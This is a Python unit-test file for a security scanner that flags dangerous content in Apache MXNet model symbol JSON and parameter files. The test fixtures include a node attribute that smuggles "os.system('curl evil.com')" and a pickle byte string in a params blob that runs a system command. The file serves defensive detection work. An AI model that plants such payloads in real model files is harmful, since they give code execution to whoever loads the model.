"""
Unit tests validating Apache MXNet symbol JSON and parameter static security analysis.
"""

import json
import unittest
from scanner.analyzers.mxnet_analyzer import MXNetAnalyzer
from scanner.rules.dangerous_symbols import RiskLevel


class TestMXNetAnalyzer(unittest.TestCase):
    def setUp(self):
        self.analyzer = MXNetAnalyzer()

    def test_clean_mxnet_symbol(self):
        symbol_dict = {
            "nodes": [
                {"op": "null", "name": "data", "inputs": []},
                {"op": "FullyConnected", "name": "fc1", "attrs": {"num_hidden": "128"}, "inputs": [[0, 0, 0]]},
            ]
        }
        findings = self.analyzer.analyze_symbol_json(json.dumps(symbol_dict), "model-symbol.json")
        self.assertEqual(len(findings), 0)

    def test_custom_operator_flagged(self):
        symbol_dict = {
            "nodes": [
                {"op": "Custom", "name": "custom_eval", "attrs": {"op_type": "evil_kernel"}, "inputs": []},
            ]
        }
        findings = self.analyzer.analyze_symbol_json(json.dumps(symbol_dict), "trojan-symbol.json")
        self.assertTrue(any(f.rule_id == "MXNET-UNSAFE-OP-CUSTOM" for f in findings))
        self.assertEqual(findings[0].severity, RiskLevel.HIGH)

    def test_python_hook_attr_flagged(self):
        symbol_dict = {
            "nodes": [
                {"op": "Activation", "name": "act1", "attrs": {"callback": "os.system('curl evil.com')"}, "inputs": []},
            ]
        }
        findings = self.analyzer.analyze_symbol_json(json.dumps(symbol_dict), "backdoor-symbol.json")
        self.assertTrue(any(f.rule_id == "MXNET-MALICIOUS-ATTR-STRING" for f in findings))
        self.assertEqual(findings[0].severity, RiskLevel.CRITICAL)

    def test_embedded_pickle_in_params_flagged(self):
        params_bytes = b"\x12\x01\x00\x00\x80\x04cos\nsystem\n(X\x04\x00\x00\x00calc\x85R."
        findings = self.analyzer.analyze_params_bytes(params_bytes, "model-0000.params")
        self.assertTrue(any(f.rule_id == "MXNET-PARAMS-EMBEDDED-PICKLE" for f in findings))


if __name__ == "__main__":
    unittest.main()
